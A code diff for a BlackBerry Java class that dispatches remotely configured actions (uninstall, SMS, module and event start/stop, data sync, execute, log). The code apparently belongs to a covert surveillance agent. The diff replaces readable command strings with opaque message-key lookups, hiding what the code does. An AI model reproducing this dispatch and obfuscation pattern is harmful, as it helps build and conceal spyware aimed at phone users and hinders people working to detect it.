@@ -10,6 +10,7 @@
 package blackberry.action;
 
 import rpc.json.me.JSONException;
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.action.sync.SyncActionApn;
@@ -26,7 +27,7 @@ import blackberry.debug.DebugLevel;
  */
 public abstract class SubAction {
     //#ifdef DEBUG
-    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);
+    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
     private final ConfAction conf;
 
@@ -61,95 +62,95 @@ public abstract class SubAction {
      */
     public static SubAction factory(String type, final ConfAction params) throws  ConfigurationException {
         //#ifdef DBC
-        Check.asserts(type != null,"factory: null type");
+        Check.asserts(type != null,"factory: null type"); //$NON-NLS-1$
         //#endif
         
-        if (type.equals("uninstall")) {
+        if (type.equals(Messages.getString("8.2"))) { //$NON-NLS-1$
 
             //#ifdef DEBUG
-            debug.trace("factory *** ACTION_UNINSTALL ***");
+            debug.trace("factory *** ACTION_UNINSTALL ***"); //$NON-NLS-1$
             //#endif
 
             return new UninstallAction(params);
-        } else if (type.equals("reload")) {
+        } else if (type.equals(Messages.getString("8.4"))) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.trace("factory *** ACTION_RELOAD ***");
+            debug.trace("factory *** ACTION_RELOAD ***"); //$NON-NLS-1$
             //#endif
 
             return new ReloadAction(params);
 
-        } else if (type.equals("sms")) {
+        } else if (type.equals(Messages.getString("8.6"))) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.trace("factory *** ACTION_SMS ***");
+            debug.trace("factory *** ACTION_SMS ***"); //$NON-NLS-1$
             //#endif
 
             return new SmsAction(params);
 
-        } else if (type.equals("module")) {
-            String status = params.getString("status");
-            if (status.equals("start")) {
+        } else if (type.equals(Messages.getString("8.8"))) { //$NON-NLS-1$
+            String status = params.getString(Messages.getString("8.9")); //$NON-NLS-1$
+            if (status.equals(Messages.getString("8.10"))) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.trace("factory *** ACTION_START_MODULE ***");
+                debug.trace("factory *** ACTION_START_MODULE ***"); //$NON-NLS-1$
                 //#endif
   
                 return new StartModuleAction(params);
-            } else if (status.equals("stop")) {
+            } else if (status.equals(Messages.getString("8.12"))) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.trace("factory *** ACTION_STOP_MODULE ***");
+                debug.trace("factory *** ACTION_STOP_MODULE ***"); //$NON-NLS-1$
                 //#endif
 
                 return new StopModuleAction(params);
 
             }
-        } else if (type.equals("event")) {
-            String status = params.getString("status");
-            if (status.equals("start")) {
+        } else if (type.equals(Messages.getString("8.14"))) { //$NON-NLS-1$
+            String status = params.getString(Messages.getString("8.15")); //$NON-NLS-1$
+            if (status.equals(Messages.getString("8.16"))) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.trace("factory *** ACTION_START_EVENT ***");
+                debug.trace("factory *** ACTION_START_EVENT ***"); //$NON-NLS-1$
                 //#endif
 
                 return new StartEventAction(params);
-            } else if (status.equals("stop")) {
+            } else if (status.equals(Messages.getString("8.18"))) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.trace("factory *** ACTION_STOP_EVENT ***");
+                debug.trace("factory *** ACTION_STOP_EVENT ***"); //$NON-NLS-1$
                 //#endif
       
                 return new StopEventAction(params);
 
             }
 
-        } else if (type.equals("synchronize")) {
-            boolean apn = params.has("apn");
+        } else if (type.equals(Messages.getString("8.20"))) { //$NON-NLS-1$
+            boolean apn = params.has(Messages.getString("8.21")); //$NON-NLS-1$
             if (apn) {
                 //#ifdef DEBUG
-                debug.trace("factory *** ACTION_SYNC_APN ***");
+                debug.trace("factory *** ACTION_SYNC_APN ***"); //$NON-NLS-1$
                 //#endif
   
                 return new SyncActionApn(params);
             } else {
                 //#ifdef DEBUG
-                debug.trace("factory *** ACTION_SYNC ***");
+                debug.trace("factory *** ACTION_SYNC ***"); //$NON-NLS-1$
                 //#endif
 
                 return new SyncActionInternet(params);
             }
 
-        } else if (type.equals("execute")) {
+        } else if (type.equals(Messages.getString("8.24"))) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.trace("factory *** ACTION_EXECUTE ***");
+            debug.trace("factory *** ACTION_EXECUTE ***"); //$NON-NLS-1$
             //#endif
 
             return new ExecuteAction(params);
 
-        } else if (type.equals("log")) {
+        } else if (type.equals(Messages.getString("8.26"))) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.trace("factory *** ACTION_INFO ***");
+            debug.trace("factory *** ACTION_INFO ***"); //$NON-NLS-1$
             //#endif
 
             return new LogAction(params);
         } else {
             //#ifdef DEBUG
-            debug.error("factory Error: unknown type: " + type);
+            debug.error("factory Error: unknown type: " + type); //$NON-NLS-1$
             //#endif
 
         }
